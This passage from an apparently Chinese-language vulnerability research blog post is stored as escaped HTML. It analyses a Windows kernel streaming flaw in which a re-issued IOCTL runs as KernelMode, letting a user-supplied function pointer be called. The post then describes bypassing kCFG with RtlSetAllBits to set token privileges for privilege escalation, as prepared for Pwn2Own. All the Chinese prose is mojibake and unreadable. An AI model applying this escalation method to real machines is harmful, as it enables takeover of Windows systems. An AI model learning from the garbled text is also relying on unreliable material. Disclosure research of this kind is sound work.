            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØÁúãÂà∞Âú®ËôïÁêÜÈÅéÁ®ã‰∏≠ÊúÉÂÖàÂ∞áÂéüÂßãÁöÑ requestÔºåË§áË£ΩÂà∞Êñ∞ÂàÜÈÖçÂá∫‰æÜÁöÑ Buffer ‰∏≠ [1]ÔºåËÄåÂæåÁ∫åÂ∞±ÊúÉ‰ΩøÁî®ÈÄôÂÄã Buffer ‰æÜ‰ΩøÁî® KsSynchronousIoControlDevice ÂëºÂè´Êñ∞ÁöÑ IOCTL [2]„ÄÇÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New_KsProperty_req&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; ÈÉΩÊòØ‰ΩøÁî®ËÄÖÊâÄÂÇ≥ÂÖ•ÁöÑÂÖßÂÆπ„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄåÂëºÂè´ UnserializePropertySet ÊôÇÁöÑÊµÅÁ®ãÔºåÂ§ßÊ¶ÇÂ¶Ç‰∏ãÂúñÊâÄÁ§∫ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂëºÂè´ IOCTL ÊôÇÂèØ‰ª•ÁúãÂà∞Âúñ‰∏≠Á¨¨ 2 Ê≠• I/O Manager ÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; Ë®≠Êàê UserMode(1)ÔºåÁõ¥Âà∞Á¨¨ 6 Ê≠•ÊôÇÔºåks ÊúÉÂéªÂà§Êñ∑‰ΩøÁî®ËÄÖ requests ÁöÑ Property ÊòØÂê¶Â≠òÂú®ÊñºË©≤ KS Object ‰∏≠ÔºåÂ¶ÇÊûúË©≤ KS Object ÁöÑ Property &lt;strong&gt;Â≠òÂú®&lt;/strong&gt;Ôºå‰∏¶‰∏îÊúâË®≠ÁΩÆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; Â∞±ÊúÉÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; ‰æÜËôïÁêÜÊåáÂÆöÁöÑ Property&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÊé•‰∏ã‰æÜÁ¨¨ 7 Ê≠•Â∞±ÊúÉÂëºÂè´ KsSynchronousIoControlDevice ÈáçÊñ∞ÂÅö‰∏ÄÊ¨°  IOCTLÔºåËÄåÊ≠§ÊôÇÊñ∞ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; Â∞±ËÆäÊàê‰∫Ü KernelMode(0) ‰∫ÜÔºåËÄåÂæåÁ∫åÁöÑËôïÁêÜÂ∞±Â¶Ç‰∏ÄËà¨ÁöÑ IOCTL_KS_PROPERTY Áõ∏ÂêåÔºåÂ∞±‰∏çÂè¶Â§ñË©≥Ëø∞‰∫ÜÔºåÁ∏Ω‰πãÊàëÂÄëÂà∞ÈÄôË£°Â∑≤Á∂ìÊúâÂÄãÂèØ‰ª•‰ªªÊÑèÂÅö IOCTL_KS_PROPERTY ÁöÑ primitive ‰∫ÜÔºåÊé•‰∏ã‰æÜÊàëÂÄëÂøÖÈ†àÂ∞ãÊâæÁúãÁúãÊòØÂê¶ÊúâÂèØ‰ª• EoP ÁöÑÂú∞Êñπ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;the-eop&quot;&gt;The EoP&lt;/h3&gt;
&lt;p&gt;ÊúÄÂÖàÁúãÂà∞ÁöÑÊÉ≥ÂøÖÂ∞±ÊòØÂÖ•Âè£Èªû ksthunkÔºåÊàëÂÄëÈÄôÈÇäÂèØ‰ª•Áõ¥Êé•‰æÜÁúã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSThunkDevice::DispatchIoctl&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DispatchIoctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CKernelFilterDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoIs32bitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;//Convert 32-bit requests to 64-bit requests&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_KS_PROPERTY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----[4];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ksthunk ÊúÉÂÖàÂà§Êñ∑ÊòØÂê¶ÊòØ WoW64 ÁöÑ Process ÁöÑ requestÔºåÂ¶ÇÊûúÊòØÂ∞±ÊúÉÂ∞áÂéüÊú¨ 32-bit ÁöÑ requests  ËΩâÊèõÊàê 64-bit ÁöÑ [3]ÔºåÂ¶ÇÊûúÂéüÊú¨Â∞±ÊòØ 64-bit ÂâáÊúÉÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSThunkDevice::CheckIrpForStackAdjustmentNative&lt;/code&gt; [4] ÂæÄ‰∏ãÂÇ≥ÈÅû&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Id&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//-----[5]   &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------[6]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// call Type3InputBuffer+0x38&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------------[7]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÂú® [5] ÁúãÂà∞ÔºåÂ¶ÇÊûúÊàëÂÄëÁµ¶ÂÆöÁöÑ Property Set ÊòØ &lt;a href=&quot;https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/a&gt; ÔºåÂ∞±ÊúâÁâπÂà•ÁöÑËôïÁêÜ„ÄÇËÄåÂú® [6] ÊôÇÔºåÊúÉÂÖàÂéªÂà§Êñ∑ Irp-&amp;gt;RequestorMode ÊòØÂê¶ÁÇ∫ KernelMode(0)ÔºåÂ¶ÇÊûúÂæû UserMode(1) ÂëºÂè´ÁöÑ IOCTL Â∞±ÊúÉÁõ¥Êé•ËøîÂõûÈåØË™§Ôºå‰ΩÜÂ¶ÇÊûúÊàëÂÄë‰ΩøÁî®ÂâçÈù¢ÊâÄË™™ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; ‰æÜÂëºÂè´ IOCTLÔºå‰∏¶ÊåáÂÆö &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ÈÄôÂÄã PropertyÔºåÈÇ£È∫ºÈÄôË£° [6] Â∞±ÊúÉÊòØ KerenlMode(0)„ÄÇÊé•‰∏ã‰æÜÂ∞±ÊúÉÂú® [7] Áõ¥Êé•‰ΩøÁî®‰ΩøÁî®ËÄÖÊâÄÂÇ≥ÂÖ•ÁöÑÂÖßÂÆπÂÅöÁÇ∫ function ÂëºÂè´ÔºåÁîöËá≥Á¨¨‰∏ÄÂÄãÂèÉÊï∏ÊòØÂèØÊéßÁöÑÔºåÂØ¶ÈöõÂØ´ PoC ÂæåÔºåÈ©óË≠â‰∫ÜÊàëÂÄëÁöÑÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂèØËÉΩÊúÉÊúâ‰∫∫ÊúâÁñëÊÉëÔºå‰ªÄÈ∫ºË®≠ÂÇôÊàñÊòØÊÉÖÊ≥Å‰∏ãÊúÉÊúâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ÔºüÂØ¶Èöõ‰∏ä‰æÜË™™Èü≥Ë®äË®≠ÂÇôÂ§ßÂ§öÊÉÖÊ≥Å‰∏ãÈÉΩÊúÉÊúâÔºå‰∏ªË¶ÅÊòØÁî®‰æÜË®≠ÁΩÆ DRM Áõ∏ÈóúÂÖßÂÆπÁî®ÁöÑ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Âú®Êúâ‰∫Ü‰ªªÊÑèÂëºÂè´‰πãÂæåÔºåË¶ÅÈÅîÊàê EoP Â∞±‰∏çÊòØÂ§™Â§ßÁöÑÂïèÈ°åÔºåÈõñÁÑ∂ÊúÉÈÅáÂà∞ kCFG„ÄÅkASLR„ÄÅSMEP Á≠âÁ≠â‰øùË≠∑Ôºå‰ΩÜÂú® Medium IL ‰∏ãÂîØ‰∏ÄÊØîËºÉÈúÄË¶ÅËôïÁêÜÁöÑÂ∞±Âè™Êúâ kCFG„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;kCFG&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;kASLR
    &lt;ul&gt;
      &lt;li&gt;NtQuerySystemInformation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SMEP
    &lt;ul&gt;
      &lt;li&gt;Reuse Kernel Code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bypass-kcfg&quot;&gt;Bypass kCFG&lt;/h4&gt;
&lt;p&gt;ÈÇ£ÊàëÂÄëÁõÆÊ®ôÂæàÁ∞°ÂñÆÔºåÂ∞±ÊòØÂæûÂêàÊ≥ïÁöÑ function ÂÅöÂá∫‰ªªÊÑèÂØ´ÁöÑ primitiveÔºåËÄå‰πãÂæåÂ∞±ÂèØ‰ª•Âà©Áî®Â∏∏Ë¶ãÁöÑÊñπÊ≥ï&lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation&quot;&gt;Áî® System token Âèñ‰ª£Áï∂ÂâçÁöÑ Process token&lt;/a&gt; ÊàñÊòØ &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Abuse token privilege&lt;/a&gt; ÂéªÂÅöÂà∞ EoP„ÄÇ&lt;/p&gt;

&lt;p&gt;Áõ¥Ë¶∫Âú∞ÊúÉÁõ¥Êé•ÂéªÊâæÁúãÁúãÔºåkCFG ‰∏≠ÂêàÊ≥ïÁöÑ function ÂêçÁ®±Êúâ set ÁöÑ functionÔºåÊØîËºÉÂèØËÉΩÊòØÂèØ‰ª•ÂØ´ÂÖ•ÁöÑ„ÄÇÊàëÂÄëÈÄôË£°ÊòØÁõ¥Êé•Êãø ntoskrnl.exe ‰∏≠ export fucntion ÂéªÂ∞ãÊâæÁúãÁúãÊòØÂê¶ÊúâÂêàÊ≥ïÁöÑ functionÔºåÈÄô‰∫õÂ§ßÂ§öÊÉÖÊ≥Å‰∏ãÈÉΩÊòØÂêàÊ≥ïÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂæàÂø´ÁöÑÊàëÂÄëÂ∞±ÊâæÂà∞‰∫Ü &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits&quot;&gt;RtlSetAllBits&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂÆÉÊòØÂÄãÈùûÂ∏∏Â•ΩÁî®ÁöÑ gadget ËÄå‰∏îÊòØ kCFG ‰∏≠ÂêàÊ≥ïÁöÑ functionÔºåÂè¶Â§ñ‰πüÂè™Ë¶ÅÊéßÂà∂‰∏ÄÂÄãÂèÉÊï∏ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_RTL_BITMAP&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BITMAP&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfBitMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÂèØÂ∞á Buffer ÊåáÂÆöÂà∞‰ªªÊÑè‰ΩçÁΩÆ‰∏¶ÊåáÂÆöÂ§ßÂ∞èÔºåÂ∞±ÂèØ‰ª•Â∞á‰∏ÄÊÆµÁØÑÂúçÁöÑ bits ÂÖ®ÈÉ®Ë®≠ÁΩÆËµ∑‰æÜÔºåÂà∞ÈÄôÈÇäÂ∞±Â∑Æ‰∏çÂ§öÁµêÊùü‰∫ÜÔºåÂè™Ë¶Å    Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Token-&amp;gt;Privilege&lt;/code&gt; ÂÖ®ÈÉ®Ë®≠ÁΩÆËµ∑‰æÜÔºåÂ∞±ÂèØ‰ª•Âà©Áî® Abuse Privilege ÊñπÊ≥ï‰æÜÂÅöÂà∞ EoP ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j1wzwXLxdVs?si=aKURBnYWXvbAaXin&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;ÁÑ∂ËÄå‚Ä¶Âú® Pwn2Own ÊØîË≥ΩÂâçÔºåÊàëÂÄëÂú® Hyper-V ‰∏äÂÆâË£ù‰∏ÄÂÄãÂÖ®Êñ∞ Windows 11 23H2 VM Ê∏¨Ë©¶ ExploitÔºåÁµêÊûúÂ§±Êïó‰∫Ü„ÄÇ ËÄå‰∏îÊòØÂú®ÈñãÂïüË®≠ÂÇôÈöéÊÆµÂ∞±Â§±Êïó„ÄÇ&lt;/p&gt;

